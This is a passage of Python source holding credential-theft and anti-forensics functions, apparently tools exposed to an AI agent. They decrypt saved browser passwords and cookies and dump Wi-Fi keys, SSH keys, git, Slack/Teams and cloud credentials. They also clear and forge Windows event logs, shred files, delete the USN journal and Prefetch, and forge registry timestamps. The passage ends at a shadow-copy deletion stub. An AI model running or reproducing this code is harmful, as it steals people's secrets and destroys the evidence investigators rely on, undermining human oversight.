            for db_path in paths:
                if not os.path.exists(db_path):
                    continue
                # User Data 目录 → 取 AES 主密钥（v80+ 必需）
                akey, akey_err = None, ''
                ud = os.path.dirname(os.path.dirname(db_path))
                try:
                    akey = self._chromium_aes_key(ud)
                except Exception as e:
                    akey_err = str(e)
                tmp = db_path + ".tmp"
                shutil.copy2(db_path, tmp)
                try:
                    conn = sqlite3.connect(tmp)
                    cursor = conn.execute(
                        "SELECT origin_url, username_value, password_value FROM logins")
                    for url, user, pwd in cursor.fetchall()[:50]:
                        # 以前这里只打印 "[encrypted:Nbytes]"，等于把密文丢回给
                        # 模型让它自己想办法。现在就地解密，直接给明文。
                        secret = None
                        try:
                            secret = self._browser_secret_decode(pwd, akey)
                        except Exception as e:
                            secret = f"[解密失败: {e}]"
                        ok_lines.append(f"URL: {url} | User: {user} | Pwd: {secret}")
                    conn.close()
                finally:
                    os.remove(tmp)
                if not akey and akey_err:
                    why.append(f"{os.path.basename(ud)} 主密钥不可用: {akey_err}")
            if not ok_lines:
                return "[BROWSER CRED] No credentials found"
            head = f"[BROWSER CRED] Found {len(ok_lines)} credentials:"
            if why:
                head += "\n[WARN] " + " | ".join(why)
            return head + "\n" + "\n".join(ok_lines[:30])
        except Exception as e:
            return f"[ERROR] Browser cred extract failed: {e}"


def _browser_cookie_extract(self, browser: str, domain_filter: str = None) -> str:
        """浏览器Cookie提取"""
        try:
            import sqlite3
            results = []
            paths = []
            if browser in ("chrome", "all"):
                paths.append(os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Cookies"))
            if browser in ("edge", "all"):
                paths.append(os.path.expanduser(r"~\AppData\Local\Microsoft\Edge\User Data\Default\Cookies"))
            for db_path in paths:
                if not os.path.exists(db_path):
                    continue
                akey = None
                ud = os.path.dirname(os.path.dirname(db_path))
                try:
                    akey = self._chromium_aes_key(ud)
                except Exception:
                    pass
                tmp = db_path + ".tmp"
                shutil.copy2(db_path, tmp)
                try:
                    conn = sqlite3.connect(tmp)
                    cursor = conn.execute("SELECT host_key, name, encrypted_value FROM cookies")
                    for host, name, val in cursor.fetchall()[:100]:
                        if domain_filter and domain_filter not in host:
                            continue
                        try:
                            real = self._browser_secret_decode(val, akey)
                        except Exception as e:
                            real = f"[解密失败: {e}]"
                        results.append(f"{host} | {name} = {real}")
                    conn.close()
                finally:
                    os.remove(tmp)
            return f"[COOKIE] Found {len(results)} cookies:\n" + "\n".join(results[:30]) if results else "[COOKIE] No cookies found"
        except Exception as e:
            return f"[ERROR] Cookie extract failed: {e}"


def _wifi_password_extract(self) -> str:
        """Wi-Fi密码提取"""
        try:
            r = subprocess.run("netsh wlan show profiles", shell=True, capture_output=True, text=True, timeout=10)
            profiles = [l.split(":")[1].strip() for l in r.stdout.split('\n') if "All User Profile" in l]
            results = []
            for p in profiles[:20]:
                r2 = subprocess.run(f'netsh wlan show profile name="{p}" key=clear', shell=True, capture_output=True, text=True, timeout=5)
                for line in r2.stdout.split('\n'):
                    if "Key Content" in line:
                        results.append(f"{p}: {line.split(':')[1].strip()}")
                        break
                else:
                    results.append(f"{p}: [no password/open]")
            return f"[WIFI] {len(results)} profiles:\n" + "\n".join(results)
        except Exception as e:
            return f"[ERROR] WiFi extract failed: {e}"


def _bitlocker_key_sniff(self) -> str:
        """BitLocker密钥嗅探"""
        try:
            results = []
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\BitLocker", 0, winreg.KEY_READ)
                i = 0
                while True:
                    try:
                        name, val, _ = winreg.EnumValue(key, i)
                        results.append(f"{name}: {val}")
                        i += 1
                    except WindowsError: break
                winreg.CloseKey(key)
            except Exception: pass
            r = subprocess.run("manage-bde -status", shell=True, capture_output=True, text=True, timeout=15)
            if r.stdout.strip():
                results.append(f"BitLocker status:\n{r.stdout[:500]}")
            return f"[BITLOCKER] Results:\n" + "\n".join(results) if results else "[BITLOCKER] No keys found"
        except Exception as e:
            return f"[ERROR] BitLocker sniff failed: {e}"


def _git_cred_extract(self, search_path: str = None) -> str:
        """Git凭证提取"""
        try:
            base = search_path or os.path.expanduser("~")
            results = []
            for root, dirs, files in os.walk(base):
                if '.git' in dirs:
                    cred_file = os.path.join(root, '.git-credentials')
                    if os.path.exists(cred_file):
                        with open(cred_file, 'r', errors='ignore') as f:
                            for line in f.readlines()[:10]:
                                results.append(line.strip())
                    config_file = os.path.join(root, '.git', 'config')
                    if os.path.exists(config_file):
                        with open(config_file, 'r', errors='ignore') as f:
                            content = f.read()
                            if 'token' in content.lower() or 'password' in content.lower():
                                results.append(f"[config] {config_file}")
                dirs[:] = [d for d in dirs if d not in ('.git', 'node_modules', '__pycache__')]
                if len(results) > 20: break
            return f"[GIT CRED] Found {len(results)} items:\n" + "\n".join(results) if results else "[GIT] No credentials found"
        except Exception as e:
            return f"[ERROR] Git cred extract failed: {e}"


def _ssh_key_steal(self, search_path: str = None) -> str:
        """SSH密钥窃取"""
        try:
            base = search_path or os.path.expanduser("~/.ssh")
            results = []
            if os.path.exists(base):
                for f in os.listdir(base):
                    fp = os.path.join(base, f)
                    if os.path.isfile(fp):
                        with open(fp, 'r', errors='ignore') as fh:
                            content = fh.read()
                            if 'PRIVATE KEY' in content:
                                results.append(f"[PRIVATE] {fp} ({len(content)} bytes)")
                            elif 'PUBLIC KEY' in content:
                                results.append(f"[PUBLIC] {fp}")
                            elif f in ('known_hosts', 'authorized_keys', 'config'):
                                results.append(f"[{f}] {fp}")
            return f"[SSH KEY] Found {len(results)} items:\n" + "\n".join(results) if results else "[SSH] No keys found"
        except Exception as e:
            return f"[ERROR] SSH key steal failed: {e}"


def _history_cmd_extract(self) -> str:
        """历史命令提取"""
        try:
            results = []
            ps_hist = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt")
            if os.path.exists(ps_hist):
                with open(ps_hist, 'r', errors='ignore') as f:
                    lines = f.readlines()[-50:]
                    results.extend([f"[PS] {l.strip()}" for l in lines if l.strip()])
            r = subprocess.run("doskey /history", shell=True, capture_output=True, text=True, timeout=5)
            if r.stdout.strip():
                results.extend([f"[CMD] {l}" for l in r.stdout.strip().split('\n')[-20:]])
            return f"[HISTORY] {len(results)} commands:\n" + "\n".join(results[-30:]) if results else "[HISTORY] No history found"
        except Exception as e:
            return f"[ERROR] History extract failed: {e}"


def _recent_files_scan(self, count: int = None) -> str:
        """最近文件扫描"""
        try:
            recent_dir = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Recent")
            results = []
            if os.path.exists(recent_dir):
                for f in os.listdir(recent_dir):
                    fp = os.path.join(recent_dir, f)
                    if os.path.isfile(fp):
                        mtime = os.path.getmtime(fp)
                        results.append((mtime, f))
            results.sort(reverse=True)
            n = count or 30
            items = [f"[{datetime.fromtimestamp(t).strftime('%Y-%m-%d %H:%M')}] {n}" for t, n in results[:n]]
            return f"[RECENT] {len(items)} files:\n" + "\n".join(items) if items else "[RECENT] No recent files"
        except Exception as e:
            return f"[ERROR] Recent files scan failed: {e}"


def _outlook_mail_search(self, keyword: str, search_path: str = None) -> str:
        """Outlook邮件搜索"""
        try:
            base = search_path or os.path.expanduser(r"~\Documents")
            results = []
            for root, dirs, files in os.walk(base):
                for f in files:
                    if f.endswith(('.pst', '.ost')):
                        fp = os.path.join(root, f)
                        results.append(f"[OUTLOOK] {fp} ({os.path.getsize(fp)//1024}KB)")
                dirs[:] = [d for d in dirs if d not in ('.git', 'node_modules')]
                if len(results) > 10: break
            return f"[OUTLOOK] Found {len(results)} mail files (keyword: '{keyword}'):\n" + "\n".join(results) if results else "[OUTLOOK] No mail files found"
        except Exception as e:
            return f"[ERROR] Outlook search failed: {e}"


def _teams_slack_token(self) -> str:
        """Teams/Slack Token提取"""
        try:
            results = []
            slack_paths = [
                os.path.expanduser(r"~\AppData\Roaming\Slack\Local Storage\leveldb"),
                os.path.expanduser(r"~\AppData\Roaming\Slack\IndexedDB"),
            ]
            for sp in slack_paths:
                if os.path.exists(sp):
                    results.append(f"[Slack] Data dir: {sp}")
            teams_paths = [
                os.path.expanduser(r"~\AppData\Roaming\Microsoft\Teams\Local Storage\leveldb"),
            ]
            for tp in teams_paths:
                if os.path.exists(tp):
                    results.append(f"[Teams] Data dir: {tp}")
            for dp in slack_paths + teams_paths:
                if os.path.exists(dp):
                    for f in os.listdir(dp):
                        if f.endswith(('.ldb', '.log')):
                            fp = os.path.join(dp, f)
                            with open(fp, 'rb') as fh:
                                content = fh.read()
                                if b'token' in content.lower() or b'xoxb-' in content or b'xoxp-' in content:
                                    results.append(f"[TOKEN FOUND] {fp}")
            return f"[TEAMS/SLACK] Results:\n" + "\n".join(results) if results else "[TEAMS/SLACK] No tokens found"
        except Exception as e:
            return f"[ERROR] Teams/Slack token failed: {e}"


def _cloud_cred_extract(self, cloud_type: str = "all") -> str:
        """云凭证提取"""
        try:
            results = []
            checks = {
                'aws': [os.path.expanduser("~/.aws/credentials"), os.path.expanduser("~/.aws/config")],
                'azure': [os.path.expanduser("~/.azure/azureProfile.json"), os.path.expanduser("~/.azure/accessTokens.json")],
                'aliyun': [os.path.expanduser("~/.aliyun/config.json")],
            }
            for cloud, paths in checks.items():
                if cloud_type not in ("all", cloud):
                    continue
                for p in paths:
                    if os.path.exists(p):
                        with open(p, 'r', errors='ignore') as f:
                            content = f.read()
                            results.append(f"[{cloud.upper()}] {p} ({len(content)} bytes)")
                            if 'key' in content.lower() or 'secret' in content.lower() or 'token' in content.lower():
                                results.append(f"  -> Contains sensitive data!")
            return f"[CLOUD CRED] Results:\n" + "\n".join(results) if results else "[CLOUD] No cloud credentials found"
        except Exception as e:
            return f"[ERROR] Cloud cred extract failed: {e}"


def _log_overwrite(self, log_name: str, event_id: int = None) -> str:
        """日志覆写"""
        try:
            if event_id:
                cmd = f'wevtutil epl {log_name} /q:"Event[System/EventID={event_id}]" /f:Text'
            else:
                cmd = f'wevtutil cl {log_name}'
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            return f"[LOG OVERWRITE] {log_name}: {r.stdout.strip() or r.stderr.strip() or 'Done'}"
        except Exception as e:
            return f"[ERROR] Log overwrite failed: {e}"


def _log_flower(self, log_name: str, message: str) -> str:
        """日志插花"""
        try:
            ps_cmd = f'powershell -Command "Write-EventLog -LogName \'{log_name}\' -Source \'EventLog\' -EntryType Information -EventId 1001 -Message \'{message}\'"'
            r = subprocess.run(ps_cmd, shell=True, capture_output=True, text=True, timeout=15)
            return f"[LOG FLOWER] Inserted into {log_name}: {r.stdout.strip() or r.stderr.strip() or 'Done'}"
        except Exception as e:
            return f"[ERROR] Log flower failed: {e}"


def _file_shred(self, file_path: str, passes: int = None) -> str:
        """文件粉碎"""
        try:
            n = passes or 3
            if not os.path.exists(file_path):
                return f"[ERROR] File not found: {file_path}"
            size = os.path.getsize(file_path)
            for i in range(n):
                with open(file_path, 'r+b') as f:
                    f.write(os.urandom(size))
                    f.flush()
                    os.fsync(f.fileno())
            tmp = file_path + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
            os.rename(file_path, tmp)
            os.remove(tmp)
            return f"[SHRED] {file_path} overwritten {n}x and deleted ({size} bytes)"
        except Exception as e:
            return f"[ERROR] File shred failed: {e}"


def _mft_overwrite(self, file_path: str) -> str:
        """MFT覆写"""
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
            filler_dir = os.path.join(os.path.dirname(file_path) or '.', '.mft_filler')
            os.makedirs(filler_dir, exist_ok=True)
            count = 0
            for i in range(100):
                fp = os.path.join(filler_dir, f'_{i:04d}')
                with open(fp, 'w') as f: f.write('x')
                count += 1
            shutil.rmtree(filler_dir, ignore_errors=True)
            return f"[MFT] Overwrite: deleted {file_path}, filled MFT with {count} entries"
        except Exception as e:
            return f"[ERROR] MFT overwrite failed: {e}"


def _usn_clear(self, drive_letter: str) -> str:
        """USN日志清除"""
        try:
            r = subprocess.run(f'fsutil usn deletejournal /d {drive_letter}:', shell=True, capture_output=True, text=True, timeout=15)
            return f"[USN] Journal deleted for {drive_letter}: {r.stdout.strip() or r.stderr.strip() or 'Done'}"
        except Exception as e:
            return f"[ERROR] USN clear failed: {e}"


def _prefetch_clear(self, program_name: str = None) -> str:
        """Prefetch清除"""
        try:
            prefetch_dir = r"C:\Windows\Prefetch"
            if program_name:
                pattern = f"{program_name.lower()}*.pf"
                removed = 0
                for f in os.listdir(prefetch_dir):
                    if f.lower().startswith(program_name.lower()) and f.endswith('.pf'):
                        os.remove(os.path.join(prefetch_dir, f))
                        removed += 1
                return f"[PREFETCH] Removed {removed} files for '{program_name}'"
            else:
                count = len([f for f in os.listdir(prefetch_dir) if f.endswith('.pf')])
                for f in os.listdir(prefetch_dir):
                    if f.endswith('.pf'):
                        try: os.remove(os.path.join(prefetch_dir, f))
                        except Exception: pass
                return f"[PREFETCH] Cleared {count} prefetch files"
        except Exception as e:
            return f"[ERROR] Prefetch clear failed: {e}"


def _reg_timestamp_forge(self, key_path: str, timestamp: str) -> str:
        """注册表时间戳篡改"""
        try:
            dt = datetime.fromisoformat(timestamp)
            ps_cmd = f'powershell -Command "$key = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey(\'{key_path}\', [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree); $ft = [System.DateTime]::Parse(\'{timestamp}\').ToFileTime(); $key.Handle.SetValue($ft, [System.Int64]::new)"'
            r = subprocess.run(ps_cmd, shell=True, capture_output=True, text=True, timeout=15)
            return f"[REG FORGE] {key_path} timestamp -> {timestamp}: {r.stdout.strip() or r.stderr.strip() or 'Attempted'}"
        except Exception as e:
            return f"[ERROR] Reg timestamp forge failed: {e}"


def _shadow_copy_delete(self) -> str:
        """影子副本删除"""
